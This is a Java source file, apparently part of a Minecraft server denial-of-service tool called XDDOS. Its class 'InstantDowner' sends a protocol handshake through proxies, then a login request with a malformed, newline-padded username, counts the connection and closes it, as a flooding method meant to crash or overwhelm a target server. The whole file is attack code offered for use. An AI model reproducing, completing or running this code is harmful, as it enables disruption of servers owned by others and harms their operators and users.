package XD.XDDOS.methods;

import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.Main;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import XD.XDDOS.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.security.SecureRandom;

public class InstantDowner
  implements Method {
    private byte[] handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();

  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("" + (new SecureRandom()).nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
